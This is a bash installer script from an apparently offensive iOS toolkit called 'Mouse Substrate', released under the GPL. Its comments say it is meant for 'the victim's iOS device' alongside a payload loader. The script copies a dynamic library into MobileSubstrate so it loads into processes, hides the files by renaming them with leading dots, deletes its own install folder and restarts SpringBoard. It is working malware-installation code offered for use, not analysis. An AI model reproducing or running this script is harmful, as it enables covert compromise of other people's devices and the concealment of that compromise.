#!/bin/bash

# 
#            --------------------------------------------------
#                              Mouse Substrate               
#            --------------------------------------------------
#          Copyright (C) <2015>  <Entynetproject (Ivan Nikolsky)>
#
#        This program is free software: you can redistribute it and/or modify
#        it under the terms of the GNU General Public License as published by
#        the Free Software Foundation, either version 3 of the License, or
#        any later version.
#
#        This program is distributed in the hope that it will be useful,
#        but WITHOUT ANY WARRANTY; without even the implied warranty of
#        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
#        GNU General Public License for more details.
#
#        You should have received a copy of the GNU General Public License
#        along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
#
#    About Author :   
#    Founder   : Entynetproject (Ivan Nikolsky)
#    Site      : http://entynetproject.simplesite.com/
#    Instagram : @entynetproject 
#    Twitter   : @entynetproject
#    Email     : entynetproject@gmail.com
#

# Install it using MPL on the victim's iOS device.
# Do not install it without Mouse Payload Loader (MPL)

if [[ $1 = "--ignore-package" ]]
then
cp mpl.dylib /Library/MobileSubstrate/DynamicLibraries
cp mpl.plist /Library/MobileSubstrate/DynamicLibraries
mv /Library/MobileSubstrate/DynamicLibraries/mpl.dylib /Library/MobileSubstrate/DynamicLibraries/.mpl.dylib
mv /Library/MobileSubstrate/DynamicLibraries/mpl.plist /Library/MobileSubstrate/DynamicLibraries/.mpl.plist
cd .. && rm -r mouse
killall SpringBoard
else
sleep 0.5
echo -e "Error, it is not a single package!"
sleep 0.5
exit
fi
